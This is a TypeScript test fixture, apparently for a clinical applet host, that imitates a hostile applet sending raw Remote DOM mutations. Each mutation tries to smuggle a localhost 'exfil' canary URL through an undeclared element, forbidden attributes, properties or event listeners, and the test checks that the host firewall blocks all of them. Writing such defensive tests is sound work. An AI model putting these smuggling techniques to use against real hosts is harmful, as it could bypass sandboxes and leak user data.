// Hostile applet: bypass the runApplet SDK entirely and drive the raw Remote DOM
// connection with hand-built mutation records — an undeclared element, a forbidden
// attribute carrying an exfil URL, and a forbidden property/event. The host
// mutation firewall must reject every one before it reaches the receiver, so no
// such node is ever created and the shell survives. (No SDK, no React.)
import {ThreadMessagePort} from '@quilted/threads';
import {PROTOCOL_VERSION} from '../../../src/shared/protocol';

const CANARY = 'http://localhost:4399/raw-mutation?d=SECRET';
const INSERT = 0;
const UPDATE_PROPERTY = 3;
const ATTRIBUTE = 2;
const EVENT = 3;
const ELEMENT = 1;

self.addEventListener('message', (event: MessageEvent<{type?: string}>) => {
  if (event.data?.type !== 'clinical-applet/connect') return;
  const port = event.ports[0];
  if (!port) return;
  port.start();
  const thread = new ThreadMessagePort(port, {exports: {ping: async () => ({ok: true})}});
  void (async () => {
    const handshake: any = await (thread.imports as any).connect({
      protocolVersion: PROTOCOL_VERSION,
      appletId: 'hostile.raw-mutation',
      appletVersion: '0',
    });
    const conn = handshake.remoteConnection;
    const tries: Array<readonly unknown[]> = [
      // 1) undeclared element smuggling an exfil URL as an attribute
      [INSERT, '~', {id: 'a', type: ELEMENT, element: 'img', attributes: {src: CANARY}, children: []}, 0],
      // 2) a known element with a forbidden attribute
      [INSERT, '~', {id: 'b', type: ELEMENT, element: 'ui-text', attributes: {href: CANARY}, children: []}, 0],
      // 3) a known element with a forbidden property
      [INSERT, '~', {id: 'c', type: ELEMENT, element: 'ui-button', properties: {formAction: CANARY}, children: []}, 0],
      // 4) a forbidden event listener
      [INSERT, '~', {id: 'd', type: ELEMENT, element: 'ui-button', eventListeners: {auxclick: () => {}}, children: []}, 0],
    ];
    for (const record of tries) {
      try {
        conn.mutate([record]);
      } catch {
        // expected: the firewall rejects and the connection is cut off
      }
    }
    // Also try a forbidden UPDATE_PROPERTY against a (never-accepted) id.
    try {
      conn.mutate([[UPDATE_PROPERTY, 'a', 'src', CANARY, ATTRIBUTE]]);
      conn.mutate([[UPDATE_PROPERTY, 'b', 'onerror', CANARY, EVENT]]);
    } catch {
      /* expected */
    }
  })();
});
